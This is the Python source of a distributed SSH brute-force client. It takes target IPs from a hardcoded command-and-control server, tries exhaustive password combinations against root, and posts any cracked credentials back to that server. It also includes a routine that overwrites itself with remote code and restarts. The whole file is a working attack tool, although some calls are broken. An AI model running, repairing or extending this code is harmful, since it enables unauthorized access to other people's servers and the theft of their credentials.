import itertools
import time
import json
import paramiko
import requests
import base64
import threading
import subprocess
import sys
import logging
import os

# Logging setup
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Hardcoded settings
USERS = ["root"]
MAX_PASSWORD_LENGTH = 12
GITHUB_REPO_URL = "https://api.github.com/repos/botsarefuture/ukrainetowin/contents/client.py"
API_BASE_URL = "http://65.108.222.76:5000"
TIMEOUT = 4


class Client():
    def __init__(self, api_base_url, timeout, github_repo_url, max_password_length, users, guess=None, username=None, target_ip=None):
        self.target_ip = target_ip
        self.api_base_url = api_base_url
        self.timeout = timeout
        self.github_repo_url = github_repo_url
        self.max_password_length = max_password_length
        self.users = users
        self.guess = guess
        self.username = username

    def fetch_update():
        try:
            response = requests.get(GITHUB_REPO_URL)
            response.raise_for_status()
            remote_content = response.json()["content"]
            remote_content = base64.b64decode(remote_content).decode("utf-8")

            with open(__file__, "r") as f:
                local_content = f.read()

            if remote_content != local_content:
                with open(__file__, "w") as f:
                    f.write(remote_content)
                logging.info(json.dumps(
                    {"message": "Updated the script from GitHub"}))

                # Restart the script with the updated version
                args = [sys.executable] + sys.argv
                subprocess.Popen(args, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
                sys.exit()
        except Exception as e:
            logging.error(json.dumps(
                {"error": "Error fetching updates from GitHub", "exception": str(e)}))

    def send_result_to_server(self, success):
        url = self.api_base_url + "/result"
        data = {"target_ip": self.target_ip, "success": success,
                "username": self.username, "password": self.guess}
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, json=data, headers=headers)
        return response

    def send_error_to_server(self, error):
        url = self.api_base_url + "/error"
        data = {"target_ip": self.target_ip, "username": self.username,
                "guess": self.guess, "error": error}
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, json=data, headers=headers)
        return response

    def send_timeout_to_server(self):
        url = self.api_base_url + "/timeout"
        data = {"target_ip": self.target_ip}
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, json=data, headers=headers)
        return response

    def send_ban_to_server(self):
        url = self.api_base_url + "/ban"
        data = {"target_ip": self.target_ip}
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, json=data, headers=headers)
        return response

    def brute_force_password(self):
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'

        for length in range(1, MAX_PASSWORD_LENGTH + 1):
            for combination in itertools.product(alphabet, repeat=length):
                guess = ''.join(combination)
                self.guess = guess
                logging.info(json.dumps(
                    {"ip": self.target_ip, "guess": guess}))
                result = self.brute()
                if result == 0:
                    return

                if result == 1:
                    continue

                if result == 6:
                    return

    def brute(self, times=0):
        self.username = self.users[times]
        result = self.ssh_login()

        if result == 1:
            creds = {"password": self.guess, "username": self.username}
            self.send_result_to_server(
                self.target_ip, True, self.username, self.guess)
            return 0

        if result == 2:
            if times == 2:
                self.send_result_to_server(False)
                return 0
            else:
                times += 1
                return self.brute(times)

        if result == 4:
            return 0

        if result == 6:
            self.send_timeout_to_server()
            return 0

    def ssh_login(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Disable key-based authentication
        client.load_system_host_keys()  # This clears any loaded keys from known_hosts
        # Ignore key validation warnings
        client.set_missing_host_key_policy(paramiko.WarningPolicy())

        try:
            client.connect(self.target_ip, username=self.username, password=self.guess,
                           timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
            client.close()
            return 1  # SSH login succeeded
        except paramiko.BadAuthenticationType as e:
            logging.info(json.dumps({"ip": self.target_ip, "username": self.username,
                                     "guess": self.guess, "error": str(e)}))
            self.send_error_to_server(str(e))
            if "Invalid user" in str(e):
                return 5  # User doesn't exist
            if "Bad authentication type; allowed types: ['publickey']" in str(e):
                return 2  # Password authentication isn't supported.
            else:
                return 0  # Other BadAuthenticationType exception occurred
        except paramiko.AuthenticationException:
            self.send_error_to_server(str(e))

            return 3  # Wrong password
        except paramiko.SSHException as e:
            self.send_error_to_server(str(e))

            logging.info(json.dumps({"ip": self.target_ip, "username": self.username,
                                     "guess": self.guess, "error": str(e)}))
            if "not open" in str(e):
                return 2  # Server doesn't support password login
            elif "Error reading SSH protocol banner" in str(e):
                return 4  # Connection error, potentially banned
            elif "timed out" in str(e):
                logging.warning("Connection timed out")
                return 6  # Connection timed out

            elif "Unable to connect to port 22" in str(e):
                self.send_ban_to_server()
                logging.critical("We're banned from port 22")
                return 4  # Probably banned

            else:
                return 0  # Other SSHException occurred

        except Exception as e:
            self.send_error_to_server(str(e))

            logging.info(json.dumps({"ip": self.target_ip, "username": self.username,
                                     "guess": self.guess, "error": str(e)}))

            if "timed out" in str(e):
                logging.warning("Connection timed out")
                return 6  # Connection timed out

            elif "Unable to connect to port 22" in str(e):
                self.send_ban_to_server()
                logging.critical("We're banned from port 22")
                return 4

            return 0  # Other exceptions occurred

    def get_target_from_server(self):
        url = self.api_base_url + "/target"
        response = requests.get(url)
        data = response.json()
        self.target_ip = data.get("target_ip")

    def update_check_thread(self):
        while True:
            self.update_script_from_github()
            time.sleep(60)  # Check for updates every 5 minutes

    def run_client_forever(self):
        while True:
            try:
                while True:
                    self.get_target_from_server()
                    if self.target_ip:
                        self.brute_force_password()
                    else:
                        logging.warning(json.dumps(
                            {"Error": "No more targets."}))
                        break

            except Exception as e:
                logging.error(json.dumps(
                    {"error": "Error occurred", "exception": str(e)}))
                # Wait for a few seconds before restarting
                time.sleep(5)

    def start(self):
        # Start the update check thread in the background
        # update_thread = threading.Thread(target=self.update_check_thread)
        # update_thread.daemon = True
        # update_thread.start()

        # Run the client forever with auto-restart on crash
        logging.info(json.dumps({"Status": "Client starting"}))
        self.run_client_forever()


client = Client(API_BASE_URL, TIMEOUT, GITHUB_REPO_URL,
                MAX_PASSWORD_LENGTH, USERS)
client.start()
